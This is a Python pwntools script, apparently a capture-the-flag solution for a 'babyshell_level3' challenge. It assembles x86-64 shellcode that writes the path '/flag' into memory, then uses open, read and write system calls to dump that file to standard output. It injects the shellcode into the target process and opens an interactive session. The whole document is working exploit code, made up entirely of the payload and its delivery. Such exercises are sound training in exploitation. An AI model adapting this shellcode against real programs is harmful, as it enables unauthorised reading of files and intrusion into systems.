from pwn import *

r = process('/challenge/babyshell_level3')

context.arch='amd64'
payload = asm(
    '''
    xor rax, rax 
    mov DWORD ptr [rbp+4], 0x616c662f
    mov BYTE ptr [rbp+8], 0x67
    mov BYTE ptr [rbp+9], al
    add rbp, 4

    xor rax, rax 
    mov al, 2
    mov rdi, rbp
    xor rsi, rsi
    xor rdx, rdx
    syscall

    xor rdi, rdi
    xor rdx, rdx
    mov dil, al
    mov rsi, rbp
    mov dl, 100
    xor rax, rax
    syscall

    xor rax, rax
    xor rdi, rdi
    xor rdx, rdx
    mov dil, 1 
    mov rsi, rbp
    mov dl, 100
    mov al, 1 
    syscall


    '''
)

#payload = payload.replace(b'\x00',b'')

r.send(payload)
r.interactive()